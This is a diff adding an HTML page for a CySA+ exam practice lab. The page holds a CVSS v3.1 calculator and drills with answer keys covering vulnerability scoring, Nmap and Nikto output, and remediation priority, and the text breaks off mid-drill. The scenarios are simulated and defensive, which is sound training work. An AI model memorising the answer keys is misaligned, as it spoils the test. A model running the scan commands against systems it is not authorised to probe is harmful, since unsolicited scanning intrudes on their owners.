@@ -1,0 +1,538 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="description" content="Hands-on CySA+ drills on simulated evidence: CVSS scoring, scanning, incident response and log triage.">
+<style>:root{box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0}img{max-width:100%}[hidden]{display:none!important}</style>
+<title>CySA+ Ops Lab</title>
+</head>
+<body>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap">
+<style>
+:root{
+  --bg:#f6f5f2; --surface:#ffffff; --surface-2:#eef1f2; --border:#dbe0e3;
+  --text:#171b1f; --text-muted:#5a6570; --accent:#6d4bc4; --accent-ink:#ffffff;
+  --term-bg:#151a20; --term-text:#d7e2ea; --term-dim:#8a9aa6; --term-hl:#2a2f45;
+  --ok:#1f8a5c; --ok-bg:#e7f4ee; --bad:#b3433c; --bad-bg:#fbeceb; --warn:#a9791c; --warn-bg:#fbf1d9;
+  --t-cvss:#6d4bc4; --t-scan:#1f8a5c; --t-ir:#a14b7a; --t-triage:#1f6f8b;
+  --shadow:0 1px 2px rgba(20,24,28,.06),0 4px 14px rgba(20,24,28,.06);
+  --font-display:'IBM Plex Mono',ui-monospace,SFMono-Regular,Menlo,monospace;
+  --font-body:'IBM Plex Sans',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#0d1216; --surface:#151c22; --surface-2:#1b242b; --border:#2b363e; --text:#e7edf1; --text-muted:#93a2ac;
+  --accent:#a98cf0; --accent-ink:#1a1030; --term-bg:#0a0e12; --term-hl:#262b40;
+  --ok:#55d69a; --ok-bg:#12291f; --bad:#f08a80; --bad-bg:#33191a; --warn:#e0b24d; --warn-bg:#332a15;
+  --t-cvss:#a98cf0; --t-scan:#55d69a; --t-ir:#e58fba; --t-triage:#5ab6d4;
+  --shadow:0 1px 2px rgba(0,0,0,.4),0 10px 26px rgba(0,0,0,.35); color-scheme:dark;}}
+:root[data-theme="dark"]{
+  --bg:#0d1216; --surface:#151c22; --surface-2:#1b242b; --border:#2b363e; --text:#e7edf1; --text-muted:#93a2ac;
+  --accent:#a98cf0; --accent-ink:#1a1030; --term-bg:#0a0e12; --term-hl:#262b40;
+  --ok:#55d69a; --ok-bg:#12291f; --bad:#f08a80; --bad-bg:#33191a; --warn:#e0b24d; --warn-bg:#332a15;
+  --t-cvss:#a98cf0; --t-scan:#55d69a; --t-ir:#e58fba; --t-triage:#5ab6d4;
+  --shadow:0 1px 2px rgba(0,0,0,.4),0 10px 26px rgba(0,0,0,.35); color-scheme:dark;}
+*{box-sizing:border-box;}
+body{background:var(--bg);color:var(--text);font-family:var(--font-body);margin:0;font-size:16px;line-height:1.55;}
+.wrap{max-width:860px;margin:0 auto;padding-inline:16px;padding-block:18px 64px;}
+h1,h2,h3{font-family:var(--font-display);font-weight:600;letter-spacing:-.01em;margin:0;text-wrap:balance;}
+button{font:inherit;}
+.top{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;margin-bottom:18px;}
+.backlink{font-family:var(--font-display);font-size:11.5px;color:var(--text-muted);text-decoration:none;padding:3px 9px;
+  border:1px solid var(--border);border-radius:999px;background:var(--surface);}
+.backlink:hover{color:var(--accent);border-color:var(--accent);}
+.nav{display:flex;gap:4px;background:var(--surface);border:1px solid var(--border);border-radius:11px;padding:3px;}
+.nav button{border:0;background:none;color:var(--text-muted);font-family:var(--font-display);font-size:12px;padding:7px 11px;border-radius:8px;cursor:pointer;}
+.nav button[aria-current="true"]{background:var(--surface-2);color:var(--text);font-weight:600;}
+.nav button:focus-visible{outline:2px solid var(--accent);}
+.eyebrow{font-family:var(--font-display);font-size:11.5px;letter-spacing:.07em;text-transform:uppercase;color:var(--accent);margin:0 0 7px;}
+h1{font-size:clamp(25px,5.4vw,32px);line-height:1.14;margin-bottom:8px;}
+.lede{color:var(--text-muted);font-size:15px;max-width:62ch;margin:0;}
+
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--border);border:1px solid var(--border);border-radius:14px;overflow:hidden;margin:20px 0;}
+.stat{background:var(--surface);padding:13px 15px;}
+.stat .l{font-family:var(--font-display);font-size:10.5px;letter-spacing:.05em;text-transform:uppercase;color:var(--text-muted);}
+.stat .v{font-family:var(--font-display);font-size:24px;font-weight:600;font-variant-numeric:tabular-nums;margin-top:3px;}
+.stat .s{font-size:12px;color:var(--text-muted);}
+@media (max-width:620px){.stats{grid-template-columns:1fr 1fr;}}
+
+.actions{display:flex;gap:10px;flex-wrap:wrap;margin:0 0 22px;}
+.btn{border:1px solid var(--border);background:var(--surface);color:var(--text);border-radius:10px;padding:10px 16px;cursor:pointer;font-weight:600;font-size:14px;}
+.btn.primary{background:var(--accent);border-color:var(--accent);color:var(--accent-ink);}
+.btn:disabled{opacity:.45;cursor:default;}
+.btn:focus-visible{outline:2px solid var(--accent);outline-offset:2px;}
+
+.tracks{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+@media (max-width:620px){.tracks{grid-template-columns:1fr;}}
+.track{background:var(--surface);border:1px solid var(--border);border-top:4px solid var(--tc);border-radius:14px;padding:16px 17px;box-shadow:var(--shadow);display:flex;flex-direction:column;gap:7px;}
+.track .n{font-family:var(--font-display);font-size:11px;color:var(--tc);letter-spacing:.06em;text-transform:uppercase;}
+.track h2{font-size:17px;}
+.track p{font-size:13.5px;color:var(--text-muted);margin:0;flex:1;}
+.track .meta{font-family:var(--font-display);font-size:11.5px;color:var(--text-muted);}
+.bar{height:6px;border-radius:9px;background:var(--surface-2);overflow:hidden;}
+.bar i{display:block;height:100%;background:var(--tc);}
+.track .btn{align-self:flex-start;margin-top:4px;}
+.tc-cvss{--tc:var(--t-cvss);} .tc-scan{--tc:var(--t-scan);} .tc-ir{--tc:var(--t-ir);} .tc-triage{--tc:var(--t-triage);}
+
+/* practice */
+.play{display:grid;grid-template-columns:1fr 230px;gap:16px;align-items:start;}
+@media (max-width:760px){.play{grid-template-columns:1fr;}}
+.card{background:var(--surface);border:1px solid var(--border);border-radius:14px;box-shadow:var(--shadow);padding:18px 19px;}
+.dmeta{display:flex;gap:7px;flex-wrap:wrap;align-items:center;font-family:var(--font-display);font-size:11px;margin-bottom:10px;}
+.chip{border:1px solid var(--border);border-radius:999px;padding:2px 8px;color:var(--text-muted);}
+.chip.tr{color:var(--tc);border-color:var(--tc);}
+.chip.pos{margin-left:auto;border:0;}
+.drill h2{font-size:20px;margin-bottom:8px;}
+.brief{font-size:15px;color:var(--text);margin:0 0 14px;}
+.term{background:var(--term-bg);color:var(--term-text);border-radius:11px;padding:12px 14px;margin:0 0 14px;font-family:var(--font-display);font-size:12.5px;line-height:1.6;overflow-x:auto;}
+.term .tt{color:var(--term-dim);font-size:10.5px;letter-spacing:.06em;text-transform:uppercase;margin-bottom:6px;}
+.term pre{margin:0;white-space:pre-wrap;word-break:break-word;font:inherit;}
+.lines{display:flex;flex-direction:column;gap:2px;}
+.lines button{all:unset;display:block;cursor:pointer;padding:4px 7px;border-radius:6px;white-space:pre-wrap;overflow-wrap:anywhere;border-left:3px solid transparent;}
+.lines button:hover{background:var(--term-hl);}
+.lines button:focus-visible{outline:2px solid var(--accent);}
+.lines button[aria-pressed="true"]{background:var(--term-hl);border-left-color:var(--accent);}
+.lines button.right{border-left-color:var(--ok);background:rgba(85,214,154,.13);}
+.lines button.wrong{border-left-color:var(--bad);background:rgba(240,138,128,.14);}
+.lines .lw{display:block;font-family:var(--font-body);font-size:12.5px;color:var(--term-dim);margin:2px 0 4px 10px;}
+.prompt{font-weight:600;margin:0 0 10px;}
+.opts{display:flex;flex-direction:column;gap:8px;}
+.opt{display:flex;gap:10px;align-items:flex-start;width:100%;text-align:left;border:1px solid var(--border);background:var(--surface);color:var(--text);
+  border-radius:10px;padding:11px 13px;cursor:pointer;font-size:14.5px;line-height:1.45;}
+.opt .k{font-family:var(--font-display);font-size:12px;color:var(--text-muted);border:1px solid var(--border);border-radius:6px;min-width:22px;text-align:center;padding:0 4px;flex:none;}
+.opt[aria-pressed="true"]{border-color:var(--accent);background:var(--surface-2);}
+.opt[aria-pressed="true"] .k{border-color:var(--accent);color:var(--accent);}
+.opt.right{border-color:var(--ok);background:var(--ok-bg);}
+.opt.wrong{border-color:var(--bad);background:var(--bad-bg);}
+.opt:disabled{cursor:default;color:var(--text);}
+.opt .why{display:block;font-size:13px;color:var(--text-muted);margin-top:4px;}
+.opt .tag{font-family:var(--font-display);font-size:11px;margin-left:auto;flex:none;}
+.opt.right .tag{color:var(--ok);} .opt.wrong .tag{color:var(--bad);}
+.order li{list-style:none;}
+.order{padding:0;margin:0;display:flex;flex-direction:column;gap:7px;}
+.orow{display:flex;align-items:center;gap:8px;border:1px solid var(--border);border-radius:10px;padding:8px 10px;background:var(--surface);}
+.orow .nn{font-family:var(--font-display);font-size:12px;color:var(--text-muted);width:20px;}
+.orow .tx{flex:1;font-size:14.5px;}
+.orow button{border:1px solid var(--border);background:var(--surface-2);color:var(--text);border-radius:7px;width:34px;height:32px;cursor:pointer;}
+.orow button:disabled{opacity:.35;cursor:default;}
+.orow.right{border-color:var(--ok);background:var(--ok-bg);} .orow.wrong{border-color:var(--bad);background:var(--bad-bg);}
+.orow .why{display:block;font-size:12.5px;color:var(--text-muted);}
+.scorein{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:0 0 14px;}
+.scorein label{display:flex;flex-direction:column;gap:4px;font-size:12.5px;font-weight:600;}
+.scorein input,.scorein select,.bench select,.bench input{font:inherit;font-size:15px;padding:9px 10px;border:1px solid var(--border);border-radius:9px;background:var(--surface);color:var(--text);width:100%;}
+.scorein .right{border-color:var(--ok);background:var(--ok-bg);} .scorein .wrong{border-color:var(--bad);background:var(--bad-bg);}
+.subh{font-family:var(--font-display);font-size:11px;letter-spacing:.06em;text-transform:uppercase;color:var(--text-muted);margin:4px 0 8px;}
+.check{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-top:16px;}
+.hint{font-size:13px;color:var(--text-muted);}
+.fb{margin-top:16px;border-radius:12px;padding:14px 16px;border:1px solid var(--border);}
+.fb.ok{background:var(--ok-bg);border-color:var(--ok);} .fb.no{background:var(--warn-bg);border-color:var(--warn);}
+.fb h3{font-size:15px;margin-bottom:6px;}
+.fb p{margin:0 0 9px;font-size:14.5px;}
+.fb .keep{font-weight:600;}
+.fb .keep b{font-family:var(--font-display);font-size:11px;letter-spacing:.05em;text-transform:uppercase;margin-right:6px;color:var(--accent);}
+.fb a{color:var(--accent);font-family:var(--font-display);font-size:12.5px;}
+.brk{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin:6px 0 10px;font-family:var(--font-display);font-size:12px;}
+.brk span{background:var(--surface);border:1px solid var(--border);border-radius:7px;padding:4px 7px;}
+@media (max-width:520px){.brk{grid-template-columns:repeat(2,1fr);}}
+.side{display:flex;flex-direction:column;gap:12px;}
+.side .card{padding:14px 15px;}
+.side h3{font-size:13px;margin-bottom:8px;}
+.dots{display:flex;flex-wrap:wrap;gap:5px;}
+.dots button{width:28px;height:28px;border-radius:7px;border:1px solid var(--border);background:var(--surface);font-family:var(--font-display);font-size:11px;color:var(--text-muted);cursor:pointer;}
+.dots button.cur{border-color:var(--accent);color:var(--accent);font-weight:600;}
+.dots button.ok{background:var(--ok-bg);border-color:var(--ok);color:var(--ok);}
+.dots button.no{background:var(--bad-bg);border-color:var(--bad);color:var(--bad);}
+.kv{display:flex;justify-content:space-between;font-size:13px;padding:3px 0;color:var(--text-muted);}
+.kv b{color:var(--text);font-family:var(--font-display);}
+
+/* workbench */
+.bench{display:grid;grid-template-columns:1fr 290px;gap:16px;align-items:start;}
+@media (max-width:760px){.bench{grid-template-columns:1fr;}}
+.vecrow{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px;}
+.vecrow input{flex:1;min-width:220px;font-family:var(--font-display);font-size:13px;}
+.metrics{display:grid;grid-template-columns:1fr 1fr;gap:10px 12px;}
+.metrics label{display:flex;flex-direction:column;gap:4px;font-size:12.5px;font-weight:600;}
+.metrics label span{font-family:var(--font-display);font-weight:400;color:var(--text-muted);font-size:11px;}
+.scorebox{background:var(--term-bg);color:var(--term-text);border-radius:14px;padding:18px;}
+.scorebox .big{font-family:var(--font-display);font-size:52px;font-weight:600;line-height:1;}
+.scorebox .big small{font-size:18px;color:var(--term-dim);}
+.sevpill{display:inline-block;margin:8px 0 12px;font-family:var(--font-display);font-size:12px;border-radius:999px;padding:3px 10px;background:#2a2f45;}
+.sev-Critical{background:#5a1f2a;color:#ffb3bd;} .sev-High{background:#5a3a14;color:#ffd08a;} .sev-Medium{background:#4a4514;color:#f2e58a;} .sev-Low{background:#173a2c;color:#8fe0b8;}
+.scorebox .row{display:flex;justify-content:space-between;font-family:var(--font-display);font-size:12.5px;padding:5px 0;border-top:1px solid #2b3540;}
+.scorebox code{display:block;font-size:11.5px;color:var(--term-dim);word-break:break-all;margin-top:10px;}
+details.calc{margin-top:12px;font-size:13.5px;}
+details.calc summary{cursor:pointer;font-weight:600;}
+details.calc pre{white-space:pre-wrap;font-family:var(--font-display);font-size:12px;background:var(--surface-2);border-radius:9px;padding:10px;}
+.err{color:var(--bad);font-size:13px;min-height:1em;}
+
+/* review */
+table.rv{width:100%;border-collapse:collapse;font-size:13.5px;}
+table.rv th{text-align:left;font-family:var(--font-display);font-size:11px;letter-spacing:.04em;text-transform:uppercase;color:var(--text-muted);padding:8px;border-bottom:1px solid var(--border);}
+table.rv td{padding:9px 8px;border-bottom:1px solid var(--border);vertical-align:top;}
+table.rv td.t b{display:block;font-size:14px;}
+table.rv td.t span{font-size:12px;color:var(--text-muted);}
+.st{font-family:var(--font-display);font-size:11.5px;border-radius:999px;padding:2px 8px;white-space:nowrap;}
+.st.ok{background:var(--ok-bg);color:var(--ok);} .st.no{background:var(--bad-bg);color:var(--bad);} .st.na{background:var(--surface-2);color:var(--text-muted);} .st.rec{background:var(--warn-bg);color:var(--warn);}
+.tblwrap{overflow-x:auto;background:var(--surface);border:1px solid var(--border);border-radius:14px;}
+.linkbtn{background:none;border:0;color:var(--accent);cursor:pointer;font-family:var(--font-display);font-size:12px;padding:4px 0;}
+.objacc{display:flex;flex-direction:column;gap:6px;margin:0 0 20px;}
+.oa{display:grid;grid-template-columns:44px 1fr 120px;gap:10px;align-items:center;font-size:13px;}
+.oa .c{font-family:var(--font-display);font-weight:600;}
+.oa .t{color:var(--text-muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.oa .p{font-family:var(--font-display);text-align:right;}
+.oa .p.low{color:var(--bad);}
+.filters{display:flex;gap:6px;flex-wrap:wrap;margin:0 0 10px;}
+.filters button{font-family:var(--font-display);font-size:12px;border:1px solid var(--border);background:var(--surface);color:var(--text-muted);border-radius:999px;padding:5px 11px;cursor:pointer;}
+.filters button[aria-pressed="true"]{border-color:var(--accent);color:var(--accent);}
+h2.sec{font-size:15px;margin:22px 0 10px;}
+.foot{margin-top:30px;padding-top:14px;border-top:1px solid var(--border);font-size:12px;color:var(--text-muted);}
+</style>
+
+<div class="wrap">
+  <div class="top">
+    <a class="backlink" href="index.html">&larr; CySA+ Toolkit</a>
+    <nav class="nav" aria-label="Ops Lab">
+      <button type="button" data-view="home">Training ground</button>
+      <button type="button" data-view="bench">CVSS workbench</button>
+      <button type="button" data-view="review">Review</button>
+    </nav>
+  </div>
+  <main id="app"></main>
+  <div class="foot">Original simulated scenarios written for this toolkit against CompTIA&rsquo;s CS0-003 objectives. All hosts, addresses and logs are invented.
+  Not official CompTIA content. CVSS scores follow the FIRST v3.1 specification.</div>
+</div>
+
+<script>
+// CVSS v3.1 Base score, per the FIRST specification (section 7 formulas, Appendix A Roundup).
+var CVSS = (function(){
+  var W = {AV:{N:0.85,A:0.62,L:0.55,P:0.2}, AC:{L:0.77,H:0.44}, UI:{N:0.85,R:0.62},
+           C:{H:0.56,L:0.22,N:0}, I:{H:0.56,L:0.22,N:0}, A:{H:0.56,L:0.22,N:0}};
+  function pr(v, s){ return v==='N' ? 0.85 : v==='L' ? (s==='C' ? 0.68 : 0.62) : (s==='C' ? 0.5 : 0.27); }
+  function roundup(x){ var i = Math.round(x * 100000); return i % 10000 === 0 ? i / 100000 : (Math.floor(i / 10000) + 1) / 10; }
+  function parse(vec){
+    var m = {}, ok = /^CVSS:3\.1\//.test(vec);
+    (vec.replace(/^CVSS:3\.[01]\//,'')).split('/').forEach(function(p){ var kv = p.split(':'); if(kv.length===2) m[kv[0]] = kv[1]; });
+    var need = {AV:'NALP',AC:'LH',PR:'NLH',UI:'NR',S:'UC',C:'HLN',I:'HLN',A:'HLN'};
+    for (var k in need){ if(!m[k] || need[k].indexOf(m[k]) < 0) return null; }
+    return m;
+  }
+  function score(m){
+    var iss = 1 - (1-W.C[m.C])*(1-W.I[m.I])*(1-W.A[m.A]);
+    var imp = m.S==='U' ? 6.42*iss : 7.52*(iss-0.029) - 3.25*Math.pow(iss-0.02, 15);
+    var exp = 8.22*W.AV[m.AV]*W.AC[m.AC]*pr(m.PR, m.S)*W.UI[m.UI];
+    var base = imp <= 0 ? 0 : m.S==='U' ? roundup(Math.min(imp+exp, 10)) : roundup(Math.min(1.08*(imp+exp), 10));
+    return {base:base, impact:imp, exploit:exp, iss:iss, sev:sev(base)};
+  }
+  function sev(b){ return b===0 ? 'None' : b<4 ? 'Low' : b<7 ? 'Medium' : b<9 ? 'High' : 'Critical'; }
+  function vector(m){ return 'CVSS:3.1/' + ['AV','AC','PR','UI','S','C','I','A'].map(function(k){ return k+':'+m[k]; }).join('/'); }
+  return {parse:parse, score:score, sev:sev, vector:vector, roundup:roundup, prw:pr, W:W};
+})();
+
+
+var DRILLS = [{"id": "cv1", "tr": "cvss", "o": "2.3", "ty": "score", "diff": "Foundation", "nb": "cvss", "title": "Comment field script", "brief": "A product-review form stores input without encoding it. An unauthenticated attacker posts a review containing script, which runs in the browser of any shopper who opens the product page. The script can read and alter a little of the shopper’s page data; it cannot take the site down.", "artT": "ASSIGNED VECTOR", "art": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "vec": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "prompt": "Calculate the Base score and severity. Why is Scope Changed here?", "opts": [["The script executes in the victim’s browser, a different security authority from the web application.", "Stored XSS is the textbook Scope Changed case: the flaw is in the server-side app, but the impact lands in the user’s browser."], ["Because more than one shopper can be affected.", "Scope is not a count of victims. It asks whether impact crosses out of the vulnerable component’s authority."], ["Because the attacker had to change a database record.", "Writing the review is how the attack is delivered. It does not decide Scope."]], "ans": 0, "explain": "6.1 Medium. Exploitability is high (network, low complexity, no privileges) but held back by UI:R, because a shopper has to open the page. Scope Changed applies the 1.08 multiplier and the changed-scope impact formula, and low C and I impacts keep the result in Medium.", "keep": "Stored XSS: UI:R because a victim must load the page, and S:C because the code runs in their browser."}, {"id": "cv2", "tr": "cvss", "o": "2.3", "ty": "score", "diff": "Foundation", "nb": "cvss", "title": "Boot from a USB stick", "brief": "Anyone who can plug a USB drive into a kiosk can boot it into a maintenance shell with full control of the disk. No account and no help from staff are needed.", "artT": "ASSIGNED VECTOR", "art": "CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "vec": "CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "prompt": "Calculate the Base score and severity. What does AV:P require?", "opts": [["Physical contact with or manipulation of the device.", "AV:P is the lowest-weighted attack vector: the attacker must touch the hardware."], ["Access from the same local subnet.", "That is Adjacent (AV:A)."], ["A logged-in local session on the kiosk.", "That is Local (AV:L): local access or a session, not physical handling."]], "ans": 0, "explain": "6.8 Medium. Impacts are all High, but AV:P (weight 0.2) drags exploitability down a long way. The same flaw reachable over the network would be 9.8.", "keep": "Same impacts, very different scores. Attack Vector is the biggest lever on exploitability."}, {"id": "cv3", "tr": "cvss", "o": "2.3", "ty": "score", "diff": "Applied", "nb": "cvss", "title": "Admin console command injection", "brief": "The router’s web admin page passes a diagnostics field to the shell. Exploiting it requires an administrator login, but then gives full control of the device over the network.", "artT": "ASSIGNED VECTOR", "art": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H", "vec": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H", "prompt": "Calculate the Base score and severity. How does PR:H change the picture?", "opts": [["It lowers exploitability, because the attacker must already hold administrative rights.", "PR:H has a weight of 0.27 with Scope Unchanged, the lowest privileges value."], ["It raises the score, because administrators have more access.", "Needing higher privileges makes exploitation harder, so the score drops."], ["It has no effect when all impacts are High.", "Exploitability and impact are calculated separately and then added, so PR always counts."]], "ans": 0, "explain": "7.2 High. All impacts are High, but requiring an admin login cuts exploitability. Worth remembering: stolen admin credentials turn this into a full compromise, so the context still matters.", "keep": "PR asks what the attacker must already have. More required privilege means a lower score."}, {"id": "cv4", "tr": "cvss", "o": "2.3", "ty": "score", "diff": "Applied", "nb": "cvss", "title": "Timing leak in a login API", "brief": "Response-time differences in a public API leak bits of a secret key, but only after many precisely timed requests under conditions the attacker cannot control. Nothing can be changed or disrupted.", "artT": "ASSIGNED VECTOR", "art": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", "vec": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", "prompt": "Calculate the Base score and severity. What does AC:H capture?", "opts": [["Conditions beyond the attacker’s control must exist before the attack succeeds.", "Attack Complexity is about conditions like race windows, network position or timing that the attacker cannot simply force."], ["The attacker needs a high-privilege account.", "That is PR:H."], ["The exploit code is technically sophisticated.", "AC is about environmental conditions, not how clever the exploit code is."]], "ans": 0, "explain": "5.9 Medium. Only confidentiality is affected, and AC:H (weight 0.44) cuts exploitability by almost half compared with AC:L.", "keep": "AC:H means the attacker needs conditions they cannot simply create, not that the exploit is hard to write."}, {"id": "cv5", "tr": "cvss", "o": "2.3", "ty": "single", "diff": "Foundation", "nb": "cvss", "title": "Write the vector", "brief": "A single malformed packet sent to a public DNS server crashes the service. No login, no user action and no special timing are needed. No data is exposed or altered.", "artT": "FINDINGS", "art": "Reachable: internet\nAuthentication: none\nUser action: none\nEffect: service crash (restarts manually)\nData exposed or changed: no", "prompt": "Which vector matches?", "opts": [["CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", "Network, easy, no privileges, no user, and only availability is hit: 7.5 High."], ["CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H", "Nothing here crosses into another security authority; the DNS service crashes itself."], ["CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "No data is exposed or changed, so C and I are None."], ["CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", "The server is internet-reachable, so the vector is Network, not Adjacent."]], "ans": 0, "explain": "A pure denial-of-service flaw is C:N/I:N/A:H. With an easy, unauthenticated network attack it scores 7.5 High: one High impact is enough for a High rating.", "keep": "Crash or outage only: C:N/I:N/A:H."}, {"id": "cv6", "tr": "cvss", "o": "2.3", "ty": "single", "diff": "Applied", "nb": "cvss", "title": "Which metric group?", "brief": "Your team wants a score that reflects that working exploit code is now public and that the vendor has released an official fix.", "artT": "TEAM REQUEST", "art": "Public exploit: yes (functional)\nVendor patch: released\nWant: adjust the published score to reflect both", "prompt": "Which CVSS metric group covers these two facts?", "opts": [["Temporal", "Exploit Code Maturity and Remediation Level are both Temporal metrics; they change over time as exploits and fixes appear."], ["Base", "Base metrics are intrinsic and do not change as exploits or patches appear."], ["Environmental", "Environmental metrics describe your own environment, such as security requirements and modified base metrics."]], "ans": 0, "explain": "Temporal metrics: Exploit Code Maturity (E), Remediation Level (RL) and Report Confidence (RC). Environmental metrics: Confidentiality/Integrity/Availability Requirements plus Modified Base metrics for your own deployment.", "keep": "Base = the flaw itself. Temporal = changes over time. Environmental = your organization."}, {"id": "cv7", "tr": "cvss", "o": "2.3", "ty": "single", "diff": "Applied", "nb": "prioritization", "title": "One score, two servers", "brief": "The same 8.8 vulnerability is found on two hosts. One is a domain-joined HR file server reachable from every workstation. The other is a decommissioned build box on an isolated VLAN with no inbound access.", "artT": "ASSET CONTEXT", "art": "HR-FS01   CVSS 8.8 | reachable from all clients | holds PII\nBLD-OLD   CVSS 8.8 | isolated VLAN | no inbound | scheduled for disposal", "prompt": "What is the best use of the identical score?", "opts": [["Treat it as equal severity, then let exposure and data value put HR-FS01 first.", "The Base score is the same; priority comes from context. HR-FS01 is reachable and holds PII."], ["Patch them in alphabetical order, since the scores tie.", "A tie in severity doesn’t mean equal risk. Context decides the order."], ["Ignore both until a 9.0 or higher appears.", "An 8.8 on a reachable PII server is urgent whatever the band."]], "ans": 0, "explain": "CVSS Base tells you how bad the flaw is in general. Exposure, asset value and threat evidence tell you how bad it is for you. The isolated box can also be handled by retiring it, as already scheduled.", "keep": "Severity is what CVSS gives you. Priority is severity plus context."}, {"id": "cv8", "tr": "cvss", "o": "2.3", "ty": "order", "diff": "Stretch", "nb": "prioritization", "title": "Order the remediation queue", "brief": "Three confirmed findings, one patching slot each day. Put them in the order you would fix them.", "artT": "QUEUE", "art": "A  CVSS 7.5 | internet-facing VPN | on CISA KEV, active exploitation\nB  CVSS 9.1 | internal app server | no known exploit | behind segmentation\nC  CVSS 5.3 | isolated lab host | no sensitive data", "prompt": "Order from first fix to last.", "opts": [["A: VPN, KEV-listed, internet-facing", "Known exploitation on an exposed system beats a higher base score with no exploitation evidence."], ["B: internal 9.1, no known exploit", "High severity and reachable from inside, so it comes next."], ["C: isolated lab 5.3", "Low severity, isolated, no sensitive data: last."]], "explain": "Exploitation in the wild plus internet exposure beats a raw 9.1. CISA’s Known Exploited Vulnerabilities catalog exists exactly for this decision.", "keep": "KEV-listed and exposed goes first, even when another finding has a higher CVSS."}, {"id": "sc1", "tr": "scan", "o": "2.1", "ty": "multi", "diff": "Applied", "nb": "scan-considerations", "title": "Scanning a hospital floor", "brief": "You have approval to scan a hospital ward network. It contains nurse workstations and networked infusion pumps that the vendor says must not be actively probed.", "artT": "RULES OF ENGAGEMENT", "art": "Scope: 10.60.12.0/24 (ward 4)\nInfusion pumps: 10.60.12.200–.230 (vendor: no active probing)\nWindow: 02:00–04:00\nScan account for workstations: approved", "prompt": "Select the THREE choices that belong in the scan plan.", "opts": [["Exclude the pump range from active scanning and inventory it passively.", "Fragile medical devices are a special consideration; passive discovery gives inventory without risk."], ["Run credentialed scans of the workstations in the window.", "Credentialed scans give accurate patch results and are approved."], ["Enable the DoS and fuzzing plug-ins to be thorough.", "Dangerous checks can take down clinical systems. Leave them disabled on production."], ["Throttle scan speed and concurrency for the ward segment.", "Performance is a listed consideration; a gentle scan keeps the network responsive."]], "ans": [0, 1, 3], "explain": "Safety first for clinical and OT-like devices: exclude them from active scans, use passive methods, keep dangerous plug-ins off, and scan gently in an agreed window.", "keep": "If a device is fragile, exclude it and discover it passively. Never be \"thorough\" with DoS checks on production."}, {"id": "sc2", "tr": "scan", "o": "2.2", "ty": "line", "diff": "Applied", "nb": "nmap-output", "title": "Read the Nmap result", "brief": "An external scan of your public address block came back. Management asks which result shows a service that should never face the internet.", "artT": "nmap -sS -sV -Pn 198.51.100.0/28", "art": ["198.51.100.2   443/tcp  open      ssl/http  nginx 1.26.2", "198.51.100.2   80/tcp   open      http      nginx 1.26.2 (redirect to 443)", "198.51.100.5   25/tcp   open      smtp      Postfix smtpd", "198.51.100.7   3389/tcp open      ms-wbt-server Microsoft Terminal Services", "198.51.100.7   445/tcp  filtered  microsoft-ds", "198.51.100.9   22/tcp   closed    ssh"], "prompt": "Click the line that is the most serious exposure.", "ans": 3, "lw": {"3": "RDP (3389) open to the internet is a prime target for brute force and RDP exploits. Put it behind VPN or ZTNA.", "4": "Filtered means a firewall dropped the probe. SMB isn’t confirmed reachable.", "5": "Closed means the host answered with a reset: nothing is listening.", "2": "A mail server on 25 is expected for an MX host."}, "explain": "Open RDP on a public address is a top initial-access vector. Web on 80/443 and SMTP on 25 are expected for those roles; filtered and closed ports are not exposures.", "keep": "open = service answered; closed = host replied with nothing listening; filtered = firewall in the way."}, {"id": "sc3", "tr": "scan", "o": "2.2", "ty": "line", "diff": "Applied", "nb": "assessment-tools", "title": "Nikto finds a lot", "brief": "Nikto ran against the marketing site. You have time to raise one urgent ticket today.", "artT": "nikto -h https://www.example.com", "art": ["+ Server: Apache/2.4.58", "+ /: The anti-clickjacking X-Frame-Options header is not present.", "+ /: The X-Content-Type-Options header is not set.", "+ /icons/README: Apache default file found.", "+ /backup/: Directory indexing found. Contains: site_2026-10.sql.gz", "+ /server-status: Apache server-status page is restricted (403)."], "prompt": "Click the finding that deserves the urgent ticket.", "ans": 4, "lw": {"4": "A browsable directory holding a database dump is likely live data exposure: credentials, customer records, everything.", "1": "Missing headers are worth fixing but are hardening items, not an emergency.", "5": "A 403 means the page is protected, which is the correct state."}, "explain": "Nikto mixes hardening notes with real exposures. A downloadable SQL backup is a confidentiality breach waiting to happen: remove it, check access logs for downloads, and rotate any secrets inside.", "keep": "Among scanner noise, look for actual data exposure first."}, {"id": "sc4", "tr": "scan", "o": "2.1", "ty": "single", "diff": "Foundation", "nb": "scan-types", "title": 